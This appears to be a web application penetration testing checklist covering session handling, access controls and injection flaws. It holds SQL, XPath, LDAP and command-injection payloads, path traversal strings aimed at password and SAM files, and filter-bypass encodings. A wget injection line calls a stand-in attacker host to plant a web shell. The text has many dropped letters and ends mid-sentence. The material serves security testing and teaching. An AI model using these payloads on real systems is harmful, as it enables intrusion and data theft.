Walk through the application in the normal way from first access (the "start" URL), through the login process, and then through all of the application's functionality.
Keep a record of every URL visited, and note every instance in which a new session token is received.
Pay particular attention to login functions and transitions between HTTP and HTTPS communications.
This can be achieved manually using a network sniffer such as Wireshark or partially automated using the logging functions of your intercepting proxy
Walk through an application to identify locations where new session tokens are received.

If HTTP cookies are being used as the transmission mechanism for session tokens, verify whether the secure flag is set, preventing them from everbeing transmitted over unencrypted connections. 

Determine whether, in the normal use of the application, sessiotokens are ever transmitted over an unencrypted connection.
If so, they should be regarded as vulnerable to interception.

Where the start page uses HTTP, and the application switches to HTTPS for the login and authenticated areas of the site, verify whether a new tokeis issued following login, or whether a token transmitted during the HTTP stage is still being used to track the user's authenticated session.
Also verify whether the application will accept login over HTTP if the login URL is modified accordingly.

Even if the application uses HTTPS for every page, verify whether the server is also listening on port 80, running any service or content.
If so, visit any HTTP URL directly from within an authenticated session, and verify whether the session token is transmitted.

In cases where a token for an authenticated session is transmitted to the server over HTTP, verify whether that token continues to be valid or is immediately terminated by the server.

Identify all the functionality within the application, and locate any logging or monitoring functions where session tokens can be viewed.
Verify who can access this functionality for example, administrators, any authenticated user, or any anonymous user.

Identify any instances within the application where sessio tokens are transmitted within the URL.
It may be that tokens are generally transmitted in a more secure manner but that developers have used the URL ispecific cases to work around particular difficulties.
For example, this behavior is often observed where a web application interfaces with an external system.

If session tokens are being transmitted in URLs, attempt to find any application functionality that enables you to inject arbitrary off-site links into pages viewed by other users.
Examples include functionality implementing a message board, site feedback, question-and-answer, and so on.
If so, submit links to a web server you control and wait to see whether any users' session tokens are received in your Referer logs.

If any session tokens are captured, attempt to hijack user sessions by using the application as normal but substituting a captured token for your own.
You can do this by intercepting the next response from the server and adding a Set-Cookie header of your own with the captured cookie value.
In Burp, you can apply a single Suite-wide configuratiothat sets a specific cookie in all requests to the target application to allow easy switching between different session contexts during testing.

If a large number of tokens are captured, and session hijacking allows you to access sensitive data such as personal details, payment information, or user passwords.

Log in to the application twice using the same user account, either from different browser processes or from different computers.
Determine whether both sessions remain active concurrently.
If so, the application supports concurrent sessions, enabling aattacker who has compromised another user's credentials to make use of these without risk of detection.

Log in and log out several times using the same user account, either from different browser processes or from different computers.
Determine whether a new session token is issued each time or whether the same token is issued each time you log in.
If the latter occurs, the application is not really employing proper sessions.

If tokens appear to contain any structure and meaning, attempt to separate out components that may identify the user from those that appear to be inscrutable.
Try to modify any user-related components of the token so that they refer to other known users of the application, and verify whether the resulting tokeis accepted by the application and enables you to masquerade as that use.

Do not fall into the trap of examining actions that the application performs on the client-side token (such as cookie invalidation via a new Set-Cookie instruction, client-side script, or an expiratiotime attribute).
In terms of session termination, nothing much depends on what happens to the token within the client browser.
Rather, investigate whether session expiration is implemented on the server side:

Log in to the application to obtain a valid session token.

Wait for a period without using this token, and then submit a request for a protected page (such as "my details") using the token.

If the page is displayed as normal, the token is still active.

Use trial and error to determine how long any session expiration timeout is, or whether a token can still be used days after the last request using it.
Burp Intruder can be configured to increment the time interval between successive requests to automate this task.

Determine whether a logout function exists and is prominently made available to users.
If not, users are more vulnerable, because they have no way to cause the application to invalidate their session.

Where a logout function is provided, test its effectiveness.
After logging out, attempt to reuse the old token and determine whether it is still valid.
If so, users remain vulnerable to some session hijacking attacks even after they have "logged out."
You can use Burp Suite to test this, by selecting a recent session-dependent request from the proxy history and sending it to Burp Repeater to reissue after you have logged out from the application.

Identify any cross-site scripting vulnerabilities within the application, and determine whether these can be exploited to capture the session tokens of other users.

If the application issues session tokens to unauthenticated users, obtain a token and perform a login.
If the application does not issue a fresh token following a successful login, it is vulnerable to session fixation.

Even if the application does not issue session tokens to unauthenticated users, obtain a token by logging in, and then return to the login page.
If the application is willing to return this page even though you are already authenticated, submit another login as a different user using the same token.
If the application does not issue a fresh token after the second login, it is vulnerable to session fixation.

Identify the format of session tokens used by the application.
Modify your token to an invented value that is validly formed, and attempt to log in.
If the application allows you to create an authenticated sessin on using an invented token, it is vulnerable to session fixation.

If the application does not support login, but processes sensitive user information (such as personal and payment details), and allows this to be displayed after submission (such as on a "verify my order" page), carry out the previous three tests in relation to the pages displaying sensitive data.
If a token id set during anonymous usage of the application can later be used to retrieve sensitive user information, the application is vulnerable to session fixation.

If the application uses HTTP cookies to transmit session tokens, it may well be vulnerable to cross-site request forgery (XSRF).
First, log in to the application.
Then confirm that a request made to the application but originating from a page of a different application results in submission of the user's token.
(This submission needs to be made from a window of the same browser process that was used to log in to the target application.)
Attempt to identify any sensitive application functions whose parameters an attacker can determine in advance, and exploit this to carry out unauthorized actions within the security context of a target user.

Review all the cookies issued by the application, and check for any domain attributes used to control the scope of the cookies.

If an application explicitly liberalizes its cookies scope to a parent domain, it may be leaving itself vulnerable to attacks via other web applications.

If an application sets its cookies domaiscope to its own domainame (or does not specify a domaiattribute), it may still be exposed to applications or functionality accessible via subdomains.
Identify all the possible domain names that will receive the cookies issued by the application.
Establish whether any other web application or functionality is accessible via these domainames that you may be able to leverage to obtain the cookies issued to users of the target application.

If the application you are attacking uses this kind of defensive measure, you may find that probing the application for many kinds of common vulnerabilities is extremely time-consuming.
The mind-numbing need to log in after each failed test and renavigate to the point of the application you were looking at would quickly cause you to give up.

In this situation, you can often use automation to tackle the problem.
When using Burp Intruder to perform an attack, you can use the Obtain Cookie feature to perform a fresh login before sending each test case, and use the new session token (provided that the login is single-stage).
Whebrowsing and probing the application manually, you cause the extensibility features of Burp Proxy via the InBurpExtender interface.
You can create an extension that detects when the application has performed a forced logout, automatically logs back ito the application, and returns the new session and page to the browser, optionally with a pop-up message to tell you what has occurred.
Although this by no means removes the problem, in certain cases it can mitigate it substantially.

Here are some questions to consider when examining aapplication's access controls:

Do application functions give individual users access to a particular subset of data that belongs to them?

Are there different levels of user, such as managers, supervisors, guests, and so on, who are granted access to different functions?

Do administrators use functionality that is built into the same application to configure and monitor it? 

What functions or data resources within the application have you identified that would most likely enable you to escalate your current privileges? 

Are there any identifiers (by way of URL parameters of POST body)

If the application segregates user access to different levels of functionality, first use a powerful account to locate all the available functionality.
Then attempt to access this using a lower-privileged account to test for vertical privilege escalation.

If the application segregates user access to different resources (such as documents), use two different user-level accounts to test whether access controls are effective or whether horizontal privilege escalation is possible.
For example, find a document that can be legitimately accessed by one user but not by another, and attempt to access it using the second user's account — either by requesting the relevant URL or by submitting the same POST parameters from within the second user's session.

With Burp configured as your proxy, browse all the application's content within one user context.
If you are testing vertical access controls, use the higher-privilege account for this.

Review the contents of Burp's site map to ensure that you have identified all the functionality you want to test.
Then use the context menu to select the "compare site maps" feature.

To select the second site map to be compared, you can either load this from a Burp state file or have Burp dynamically rerequest the first site map in a new session context.
To test horizontal access controls between users of the same type, you can simply load a state file you saved earlier, having mapped the application as a different user.
For testing vertical access controls, it is preferable to rerequest the high-privilege site map as a low-privileged user, because this ensures complete coverage of the relevant functionality.

To rerequest the first site map ia different session, you need to configure Burp's session-handling functionality with the details of the low-privilege user session (for example, by recording a login macro or providing a specific cookie to be used irequests).
You may also need to define suitable scope rules to prevent Burp from requesting any logout function.

When an action is carried out in a multistep way, involving several different requests from client to server, test each request individually to determine whether access controls have beeapplied to it.
Be sure to include every request, including form submissions, the following of redirections, and any unparameterized requests.

Try to find any locations where the application effectively assumes that if you have reached a particular point, you must have arrived via legitimate means.
Try to reach that point in other ways using a lower-privileged account to detect if any privilege escalation attacks are possible.

One way to perform this testing manually is to walk through a protected multistage process several times in your browser and use your proxy to switch the session token supplied in different requests to that of a less-privileged user.

You can often dramatically speed up this process by using the "request in browser" feature of Burp Suite:
Use the higher-privileged account to walk through the entire multistage process.

Log in to the application using the lower-privileged account (or none at all).

In the Burp Proxy history, find the sequence of requests that were made when the multistage process was performed as a more privileged user.
For each request in the sequence, select the context menu item "request in browser in current browser session".
Paste the provided URL into your browser that is logged in as the lower-privileged user.

If the application lets you, follow through the remainder of the multi-stage process in the normal way, using your browser.

View the result within both the browser and the proxy history to determine whether it successfully performed the privileged action.

Use the content discovery techniques to identify as much of the application's functionality as possible.
Performing this exercise as a low-privileged user is often sufficient to both enumerate and gain direct access to sensitive functionality.

Where application pages are identified that are likely to present different functionality or links to ordinary and administrative users (for example, Control Panel or My Home Page), try adding parameters such as admin=true to the URL query string and the body of POST requests.
This will help you determine whether this uncovers or gives access to any additional functionality than your user context has normal access to.

Test whether the application uses the Referer header as the basis for making access control decisions.
For key application functions that you are authorized to access, try removing or modifying the Referer header, and determine whether your request is still successful.
If not, the application may be trusting the Referer header in an unsafe way.
If you scan requests using Burp's active scanner, Burp tries to remove the Referer header from each request and informs you if this appears to make a systematic and relevant difference to the application's response.

Review all client-side HTML and scripts to find references to hidden functionality or functionality that can be manipulated on the client side, such as script-based user interfaces.
Also, decompile all browser extension components to discover any references to server-side functionality.

Where the application uses identifiers of any kind (document IDs, account numbers, order references) to specify which resource a user is requesting, attempt to discover the identifiers for resources to which you do not have authorized access.

If it is possible to generate a series of such identifiers in quick succession (for example, by creating multiple new documents or orders), use the techniques for session tokens to try to discover any predictable sequences in the identifiers the application produces. 

If it is not possible to generate any new identifiers, you are restricted to analyzing the identifiers you have already discovered, or even using plain guesswork.
If the identifier has the form of a GUID, it is unlikely that any attempts based on guessing will be successful.
However, if it is a relatively small number, try other numbers in close range, or random numbers with the same number of digits.

If access controls are found to be broken, and resource identifiers are found to be predictable, you can mount an automated attack to harvest sensitive resources and informatiofrom the application.

A catastrophic vulnerability of this kind occurs where an Account Information page displays a user's personal details together with his username and password.
Although the password typically is masked on-screen, it is nevertheless transmitted in full to the browser.
Here, you can often quickly iterate through the full range of account identifiers to harvest the login credentials of all users, including administrators.

Identify any parameters that follow Java naming conventions (for example, get, set, add, update, is, or has followed by a capitalized word), or explicitly specify a package structure (for example, com.companyname. xxx.yyy.ClassName).
Make a note of all referenced methods you can find.

Look out for a method that lists the available interfaces or methods.
Check through your proxy history to see if it has been called as part of the application's normal communication.
If not, try to guess it using the observed naming convention.

Consult public resources such as search engines and forum sites to determine any other methods that might be accessible.

Attempt to access all methods gathered using a variety of user account types, including unauthenticated access.

If you do not know the number or types of arguments expected by some methods, look for methods that are less likely to take arguments, such as listInterfaces and getAllUsersInRoles.

Step through the normal process for gaining access to a protected static resource to obtain an example of the URL by which it is ultimately retrieved.

Using a different user context (for example, a less-privileged user or an account that has not made a required purchase), attempt to access the resource directly using the URL you have identified.

If this attack succeeds, try to understand the naming scheme being used for protected static files.
If possible, construct an automated attack to trawl for content that may be useful or that may contain sensitive data.

Using a high-privileged account, identify some privileged requests that perform sensitive actions, such as adding a new user or changing a user's security role.

If these requests are not protected by any anti-CSRF tokens or similar features, use the high-privileged account to determine whether the application still carries out the requested action if the HTTP method is modified.
Test the following HTTP methods:
POST
GET
HEAD
An arbitrary invalid HTTP method

If the application honors any requests using different HTTP methods than the original method, test the access controls over those requests using the standard methodology already described, using accounts with lower privileges.

If you are attacking aapplication that employs a multilayered privilege model of this kind, it is likely that many of the most obvious mistakes that are commonly made in applying access controls will be defended against.
You may find that circumventing the controls implemented within the application does not get you very far, because of protection in place at other layers.
With this in mind, several potential lines of attack are still available to you.
Most importantly, understanding the limitations of each type of control, in terms of the protection it does not offer, will help you identify the vulnerabilities that are most likely to affect it:
Programmatic checks within the application layer may be susceptible to injection-based attacks.
Roles defined at the application server layer are often coarsely defined and may be incomplete.

Where application components run using low-privileged operating system accounts, typically they can read many kinds of potentially sensitive data withinthe host file system.
Any vulnerabilities granting arbitrary file access may still be usefully exploited, even if only to read sensitive data.
Vulnerabilities within the application server software itself typically enable you to defeat all access controls implemented within the application layer, but you may still have limited access to the database and operating system.

A single exploitable access control vulnerability in the right location may still provide a starting point for serious privilege escalation.
For example, if you discover a way to modify the role associated with your account, you may find that logging in a gain with that account gives you enhanced access at both the application and database layers.

Injection into interpreted languages is a broad topic, encompassing many different kinds of vulnerabilities and potentially affecting every component of a web application's supporting infrastructure.
The detailed steps for detecting and exploiting code injection flaws depend on the language that is being targeted and the programming techniques employed by the application's developers.
In every instance, however, the generic approach is as follows:

Supply unexpected syntax that may cause problems within the context of the particular interpreted language.

Identify any anomalies in the application's response that may indicate the presence of a code injection vulnerability.

If any error messages are received, examine these to obtain evidence about the problem that occurred on the server.

If necessary, systematically modify your initial input in relevant ways in an attempt to confirm or disprove your tentative diagnosis of a vulnerability.

Construct a proof-of-concept test that causes a safe command to be executed in a verifiable way, to conclusively prove that an exploitable code injection flaw exists.

Exploit the vulnerability by leveraging the functionality of the target language and component to achieve your objectives.

Submit a single quotation mark as the item of data you are targeting.
Observe whether an error occurs, or whether the result differs from the original in any other way.
Understand the meaning of any SQL error message.

If an error or other divergent behavior was observed, submit two single quotatiomarks together.
Databases use two single quotatiomarks as an escape sequence to represent a literal single quote, so the sequence is interpreted as data within the quoted string rather than the closing string terminator.
If this input causes the error or anomalous behavior to disappear, the application is probably vulnerable to SQL injection.

As a further verification that a bug is present, you cause SQL concatenator characters to construct a string that is equivalent to some benign input.
If the application handles your crafted input in the same way as it does the corresponding benign input, it is likely to be vulnerable.
Each type of database uses different methods for string concatenation.
The following examples can be injected to construct input that is equivalent to FOO in a vulnerable application:
Oracle: '||'FOO
MS-SQL: '+'FOO
MySQL: ' 'FOO (note the space betweethe two quotes)

Try supplying a simple mathematical expressiothat is equivalent to the original numeric value. For example, if the original value is 2, try submitting 1+1 or 3-1. If the application responds in the same way, it may be vulnerable.

The preceding test is most reliable in cases where you have confirmed that the item being modified has a noticeable effect othe application's behavior.
For example, if the application uses a numeric PageID parameter to specify which content should be returned, substituting 1+1 for 2 with equivalent results is a good sign that SQL injectiois present.
However, if you can place arbitrary input into a numeric parameter without changing the application's behavior, the preceding test provides no evidence of a vulnerability.

If the first test is successful, you can obtain further evidence of the vulnerability by using more complicated expressions that use SQL-specific keywords and syntax.
A good example of this is the ASCII command, which returns the numeric ASCII code of the supplied character.
For example, because the ASCII value of A is 65, the following expression is equivalent to 2 in SQL: 67-ASCII('A')

The preceding test will not work if single quotes are being filtered.
However, in this situation you can exploit the fact that databases implicitly convert numeric data to string data where required.
Hence, because the ASCII value of the character 1 is 49, the following expression is equivalent to 2 in SQL: 51-ASCII(1)

Make a note of any parameters that appear to control the order or field types within the results that the application returns. 

Make a series of requests supplying a numeric value in the parameter value, starting with the number 1 and incrementing it with each subsequent request:

If changing the number in the input affects the ordering of the results, the input is probably being inserted into an ORDER BY clause.
In SQL, ORDER BY 1 orders by the first column.
Increasing this number to 2 should then change the display order of data to order by the second column.
If the number supplied is greater than the number of columns in the result set, the query should fail.
In this situation, you can confirm that further SQL can be injected by checking whether the results order can be reversed, using the following:
1 ASC --
1 DESC --

If supplying the number 1 causes a set of results with a column containning a 1 in every row, the input is probably being inserted into the name of a colum being returned by the query.
For example: SELECT 1,title,year FROM books WHERE publisher='Wiley'

Your first task is to discover the number of columns returned by the original query being executed by the application.
You can do this in two ways:

You can exploit the fact that NULL can be converted to any data type to systematically inject queries with different numbers of columns until your injected query is executed.
For example:

' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--

When your query is executed, you have determined the number of columns required.
If the application doesn't return database error messages, you can still tell when your injected query was successful.
An additional row of data will be returned, containning either the word NULL or an empty string.
Note that the injected row may contain only empty table cells and so may be hard to see when rendered as HTML.
For this reason it is preferable to look at the raw response when performing this attack.

Having identified the required number of columns, your next task is to discover a colum that has a string data type so that you cause this to extract arbitrary data from the database.
You can do this by injecting a query containning NULLs, as you did previously, and systematically replacing each NULL with a.
For example, if you know that the query must return three columns, you can inject the following:

' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a'--

When your query is executed, you see an additional row of data containning the value a.
You can then use the relevant column to extract data from the database.

When you have identified an SQL injection vulnerability, using the techniques described earlier in this chapter, you can consider using a SQL injection tool to exploit the vulnerability and retrieve interesting data from the database.
This option is particularly useful in cases where you need to use blind techniques to retrieve a small amount of data at a time.

Run the SQL exploitation tool using an intercepting proxy.
Analyze the requests made by the tool as well as the application's responses.
Turn on any verbose output options on the tool, and correlate its progress with the observed queries and responses.

Because these kinds of tools rely on preset tests and specific response syntax, it may be necessary to append or prepend data to the string injected by the tool to ensure that the tool gets the expected response.
Typical requirements are adding a comment character, balancing the single quotes within the server's SQL query, and appending or prepending closing brackets to the string to match the original query.

If the syntax appears to be failing regardless of the methods described here, it is often easiest to create a nested subquery that is fully under your control, and allow the tool to inject into that.
This allows the tool to use inference to extract data.
Nested queries work well wheyou inject into standard SELECT and UPDATE queries.
Under Oracle they work within an INSERT statement.
In each of the following cases, prepend the text occurring before [input], and append the closing bracket occurring after that point:

Oracle: '||(select 1 from dual where 1=[input])
MS-SQL: (select 1 where 1=[input])

Try submitting the following values, and determine whether these result in different application behavior, without causing an error:

' or count(parent::*[position()=1])=0 or 'a'='b
' or count(parent::*[position()=1])>0 or 'a'='b

If the parameter is numeric, also try the following test strings:
1 or count(parent::*[position()=1])=0
1 or count(parent::*[position()=1])>0

If any of the preceding strings causes differential behavior within the application without causing an error, it is likely that you can extract arbitrary data by crafting test conditions to extract one byte of information at a time.
Use a series of conditions with the following form to determine the name of the current node's parent: substring(name(parent::*[position()=1]),1,1)='a'

Having extracted the name of the parent node, use a series of conditions with the following form to extract all the data within the XML tree:
substring(//parentnodename[position()=1]/child::node() [position()=1]/text(),1,1)='a'

Try entering just the * character as a search term.
This character functions as a wildcard in LDAP, but not in SQL.
If a large number of results are returned, this is a good indicator that you are dealing with an LDAP query.

Try entering a number of closing brackets:
))))))))))

This input closes any brackets enclosing your input, as well as those that encapsulate the main search filter itself.
This results in unmatched closing brackets, thus invalidating the query syntax.
If an error results, the application may be vulnerable to LDAP injection.
(Note that this input may also break many other kinds of application logic, so this provides a strong indicator only if you are already confident that you are dealing with aLDAP query.)

Try entering various expressions designed to interfere with different types of queries, and see if these allow you to influence the results being returned.
The cattribute is supported by all LDAP implementations and is useful to use if you do not know any details about the directory you are querying.
For example:
)(cn=*
*))(|(cn=*
*))%00

You can normally use the ping command as a means of triggering a time delay by causing the server to ping its loopback interface for a specific period.
There are minor differences between how Windows and UNIX based platforms handle command separators and the ping command.
However, the following all-purpose test string should induce a 30-second time delay on either platform if no filtering is in place:

|| ping -i 30 127.0.0.1 ; x || ping -30 127.0.0.1 &

To maximize your chances of detecting a command injection flaw if the application is filtering certain command separators, you should also submit each of the following test strings to each targeted parameter iturand monitor the time taken for the application to respond:

| ping –i 30 127.0.0.1 |
| ping –30 127.0.0.1 |
& ping –i 30 127.0.0.1 &
& ping –30 127.0.0.1 &
; ping 127.0.0.1 ;
%0a ping –i 30 127.0.0.1 %0a
` ping 127.0.0.1 `

If a time delay occurs, the application may be vulnerable to command injection.
Repeat the test case several times to confirm that the delay was not the result of network latency or other anomalies.
You can try changing the value of the -or -i parameters and confirming that the delay experienced varies systematically with the value supplied.

Using whichever of the injection strings was found to be successful, try injecting a more interesting command (such as ls or dir).
Determine whether you can retrieve the results of the command to your browser.

If you are unable to retrieve results directly, you have other options:

You can attempt to open an out-of-band channel back to your computer.

Try using TFTP to copy tools up to the server, using telnet or netcat to create a reverse shell back to your computer, and using the mail command to send command output via SMTP.

You can redirect the results of your commands to a file within the web root, which you can then retrieve directly using your browser.
For example: dir > c:\inetpub\wwwroot\foo.txt

When you have found a means of injecting commands and retrieving the results, you should determine your privilege level (by using whoami or something similar, or attempting to write a harmless file to a protected directory).
You may then seek to escalate privileges, gain backdoor access to sensitive application data, or attack other hosts reachable from the compromised server.

The < and > characters are used, respectively, to direct the contents of a file to the command's input and to direct the command's output to a file.
If it is not possible to use the preceding techniques to inject an entirely separate command, you may still be able to read and write arbitrary file contents using the < and > characters.

Many operating system commands that applications invoke accept a number of command-line parameters that control their behavior.
Often, user-supplied input is passed to the command as one of these parameters, and you may be able to add further parameters simply by inserting a space followed by the relevant parameter.
For example, a web-authoring application may contain a function in which the server retrieves a user-specified URL and renders its contents in-browser for editing.
If the application simply calls out to the wget program, you may be able to write arbitrary file contents to the server's filesystem by appending the -O command-line parameter used by wget.
For example: url=http://wahh-attacker.com/%20-O%20c:\inetpub\wwwroot\scripts\cmdasp.asp

Any item of user-supplied data may be passed to a dynamic execution function.
Some of the items most commonly used in this way are the names and values of cookie parameters and persistent data stored in user profiles as the result of previous actions.

Try submitting the following values ituras each targeted parameter:
;echo%20111111
echo%20111111
response.write%20111111
:response.write%20111111

Review the application's responses.
If the string 111111 is returned on its own (is not preceded by the rest of the command string), the application is likely to be vulnerable to the injection of scripting commands.

If the string 111111 is not returned, look for any error messages that indicate that your input is being dynamically executed and that you may need to fine-tune your syntax to achieve injection of arbitrary commands.

If the application you are attacking uses PHP, you cause the test string phpinfo(), which, if successful, returns the configuration details of the PHP environment.

If the application appears to be vulnerable, verify this by injecting some commands that result in time delays, as described previously for OS command injection.
For example: system('ping%20127.0.0.1')

Review the information gathered during application mapping to identify the following:
Any instance where a request parameter appears to contain the name of a file or directory, such as include=main.inc or template=/en/sidebar.

Any application functions whose implementation is likely to involve retrieval of data from a server filesystem (as opposed to a back-end database), such as the displaying of office documents or images.

During all testing you perform in relation to every other kind of vulnerability, look for error messages or other anomalous events that are of interest.
Try to find any evidence of instances where user-supplied data is being passed to file APIs or as parameters to operating system commands.

If you have local access to the web application, do the following:

Use a suitable tool to monitor all filesystem activity othe server.
For example, the FileMotool from SysInternals can be used on the Windows platform, the ltrace/strace tools can be used on Linux, and the truss command cabe used on Sun's Solaris.

Test every page of the application by inserting a single unique string (such as traversaltest) into each submitted parameter (including all cookies, query string fields, and POST data items).
Target only one parameter at a time, and use the automated techniques.

Set a filter in your filesystem monitoring tool to identify all filesystem events that contain your test string.

If any events are identified where your test string has been used as or incorporated into a file or directory name, test each instance (as described next) to determine whether it is vulnerable to path traversal attacks.

Working on the assumption that the parameter you are targeting is being appended to a preset directory specified by the application, modify the parameter's value to insert an arbitrary subdirectory and a single traversal sequence.
For example, if the application submits this parameter:
file=foo/file1.txt
try submitting this value:
file=foo/bar/../file1.txt

If the application's behavior is identical in the two cases, it may be vulnerable.
You should proceed directly to attempting to access a different file by traversing above the start directory.

If the application's behavior is different in the two cases, it may be blocking, stripping, or sanitizing traversal sequences, resulting in an invalid file path.
You should examine whether there are any ways to circumvent the application's validation filters.
The reason why this test is effective, even if the subdirectory "bar" does not exist, is that most common filesystems perform canonicalization of the file path before attempting to retrieve it.
The traversal sequence cancels out the invented directory, so the server does not check whether it is present.

If the application function you are attacking provides read access to a file, attempt to access a known world-readable file othe operating system in question.
Submit one of the following values as the filename parameter you control:

../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../windows/win.ini

If you are lucky, your browser displays the contents of the file you have requested.

If the function you are attacking provides write access to a file, it may be more difficult to verify conclusively whether the application is vulnerable.
One test that is often effective is to attempt to write two files — one that should be writable by any user, and one that should not be writable even by root or Administrator.
For example, on Windows platforms you catry this:

../../../../../../../../../../../../writetest.txt
../../../../../../../../../../../../windows/system32/config/sam

OUNIX-based platforms, files that root may not write are version dependent, but attempting to overwrite a directory with a file should always fail, so you can try this:

../../../../../../../../../../../../tmp/writetest.txt
../../../../../../../../../../../../tmp

For each pair of tests, if the application's behavior is different in response to the first and second requests (for example, if the second returns an error message but the first does not), the application probably is vulnerable.

An alternative method for verifying a traversal flaw with write access is to try to write a new file within the web root of the web server and then attempt to retrieve this with a browser.
However, this method may not work if you do not know the location of the web root directory or if the user context in which the file access occurs does not have permission to write there.

Always try path traversal sequences using both forward slashes and backslashes.
Many input filters check for only one of these, when the filesystem may support both.

Try simple URL-encoded representations of traversal sequences using the following encodings.
Be sure to encode every single slash and dot within your input:

Dot — %2e

Forward slash — %2f

Backslash — %5c

Try using 16-bit Unicode encoding:

Dot — %u002e

Forward slash — %u2215

Backslash — %u2216

Try double URL encoding:

Dot — %252e

Forward slash — %252f

Backslash — %255c

Try overlong UTF-8 Unicode encoding:

Dot — %c0%2e, %e0%40%ae, %c0ae, and so on

Forward slash — %c0%af, %e0%80%af, %c0%2f, and so on

Backslash — %c0%5c, %c0%80%5c, and so on

You can use the illegal Unicode payload type within Burp Intruder to generate a huge number of alternate representations of any given character and submit this at the relevant place within your target parameter.
These representations strictly violate the rules for Unicode representation but nevertheless are accepted by many implementations of Unicode decoders, particularly on the Windows platform.

If the application is attempting to sanitize user input by removing traversal sequences and does not apply this filter recursively, it may be possible to bypass the filter by placing one sequence within another.
For example:

....//
....\/
..../\
....\\

Some applications check whether the user-supplied filename ends in a particular file type or set of file types and reject attempts to access anything else.

Sometimes this check can be subverted by placing a URL-encoded null byte at the end of your requested filename, followed by a file type that the application accepts.
For example:

../../../../../boot.ini%00.jpg

The reason this attack sometimes succeeds is that the file type check is implemented using an API ia managed execution environment in which strings are permitted to contain null characters (such as String. endsWith() in Java).
However, when the file is actually retrieved, the application ultimately uses an API in an unmanaged environment in which strings are null-terminated.
Therefore, your filename is effectively truncated to your desired value.

Some applications attempt to control the file type being accessed by appending their own file-type suffix to the filename supplied by the user.
In this situation, either of the preceding exploits may be effective, for the same reasons.

Some applications check whether the user-supplied filename starts with a particular subdirectory of the start directory, or even a specific filename.

This check can, of course, be bypassed easily as follows:

filestore/../../../../../../../etc/passwd

If none of the preceding attacks against input filters is successful individually, the application might be implementing multiple types of filters.
Therefore, you need to combine several of these attacks simultaneously (both against traversal sequence filters and file type or directory filters).
If possible, the best approach here is to try to break the problem into separate stages.
For example, if the request for: diagram1.jpg is successful, but the request for: foo/../diagram1.jpg fails, try all the possible traversal sequence bypasses until a variation on the second request is successful.
If these successful traversal sequence bypasses don't enable you to access /etc/passwd, probe whether any file type filtering is implemented and can be bypassed by requesting: diagram1.jpg%00.jpg

Working entirely within the start directory defined by the application, try to probe to understand all the filters being implemented, and see whether each cabe bypassed individually with the techniques described.

Of course, if you have whitebox access to the application , your task is much easier, because you casystematically work through different types of input and verify conclusively what filename (if any) is actually reaching the filesystem.

You can exploit read access path traversal flaws to retrieve interesting files from the server that may contain directly useful information or that help you refine attacks against other vulnerabilities.
For example:

Password files for the operating system and application.

Server and application configuration files to discover other vulnerabilities or fine-tune a different attack Include files that may contain database credentials.

Data sources used by the application, such as MySQL database files or XML files.

The source code to server-executable pages to perform a code review in search of bugs (for example, GetImage.aspx?file=GetImage.aspx).

Applicatiolog files that may contain usernames and session tokens and the like.

If you find a path traversal vulnerability that grants write access, your main goal should be to exploit this to achieve arbitrary execution of commands on the server.
Here are some ways to exploit this vulnerability:

Create scripts in users startup folders.

Modify files such as in.ftpd to execute arbitrary commands when a user next connects.

Write scripts to a web directory with execute permissions, and call them from your browser.

To test for remote file inclusion flaws, follow these steps:

Submit in each targeted parameter a URL for a resource on a web server that you control, and determine whether any requests are received from the server hosting the target application.

If the first test fails, try submitting a URL containning a nonexistent IP address, and determine whether a timeout occurs while the server attempts to connect.

If the application is found to be vulnerable to remote file inclusion, construct a malicious script using the available APIs in the relevant language.
Local file inclusion vulnerabilities can potentially exist in a much wider range of scripting environments than those that support remote file inclusion.
To test for local file inclusion vulnerabilities, follow these steps:

Submit the name of a known executable resource on the server, and determine whether any change occurs in the application's behavior.

Submit the name of a known static resource on the server, and determine whether its contents are copied into the application's response.

If the application is vulnerable to local file inclusion, attempt to access any sensitive functionality or resources that you cannot reach directly via the web server.

Test to see if you can access files in other directories using the traversal techniques described previously.

Submit a rogue XML closing tag such as </foo> in each parameter in turn.
If no error occurs, your input is probably not being inserted into a SOAP message, or it is being sanitized in some way.

If an error was received, submit instead a valid opening and closing tag pair, such as <foo></foo>.
If this causes the error to disappear, the application may be vulnerable.

In some situations, data that is inserted into an XML-formatted message is subsequently read back from its XML form and returned to the user.
If the item you are modifying is being returned in the application's responses, see whether any XML content you submit is returned in its identical form or has been normalized in some way.
Submit the following two values iturn:

test<foo/>
test<foo></foo>

If you find that either item is returned as the other, or simply as test, you can be confident that your input is being inserted into an XML-based message.

If the HTTP request contains several parameters that may be being placed into a SOAP message, try inserting the opening comment character (<!--) into one parameter and the closing comment character (!-->) into another parameter.
The switch these around (because you have no way of knowing in which order the parameters appear).
Doing so can have the effect of commenting out a portion of the server's SOAP message.
This may cause a change in the application's logic or result in a different error condition that may divulge information.

Identify any request parameters that appear to contain hostnames, IP addresses, or full URLs.

For each parameter, modify its value to specify an alternative resource, similar to the one being requested, and see if that resource appears in the server's response.

Try specifying a URL targeting a server othe Internet that you control, and monitor that server for incoming connections from the application you are testing.

If no incoming connection is received, monitor the time taken for the application to respond.
If there is a delay, the application's back-end requests may be timing out due to network restrictions on outbound connections.

If you are successful in using the functionality to connect to arbitrary URLs, try to perform the following attacks:
Determine whether the port number can be specified.
For example, you might supply http://mdattacker.net:22.

If successful, attempt to port-scan the internal network by using a tool such as Burp Intruder to connect to a range of IP addresses and ports in sequence.

Attempt to connect to other services on the loopback address of the application server.

Attempt to load a web page that you control into the application's response to deliver a cross-site scripting attack.

Target each request parameter in turn, and try to append a new injected parameter using various syntax:

%26foo%3dbar — URL-encoded &foo=bar
%3bfoo%3dbar — URL-encoded ;foo=bar
%2526foo%253dbar — Double URL-encoded &foo=bar

Identify any instances where the application behaves as if the original parameter were unmodified.
(This applies only to parameters that usually cause some difference in the application's response when modified.)

Each instance identified in the previous step has a chance of parameter injection.
Attempt to inject a known parameter at various points in the request to see if it can override or modify an existing parameter.
For example:
FromAccount=18281008%26Amount%3d4444&Amount=1430&ToAccount=08447656

If this causes the new value to override the existing one, determine whether you can bypass any front-end validatioby injecting a value that is read by a backend server.

Replace the injected known parameter with additional parameter names as described for application mapping.

Test the application's tolerance of multiple submissions of the same parameter within a request.
Submit redundant values before and after other parameters, and at different locations within the request (within the query string, cookies, and the message body).

You should submit each of the following test strings as each parameter in turn, inserting your own e-mail address at the relevant position:

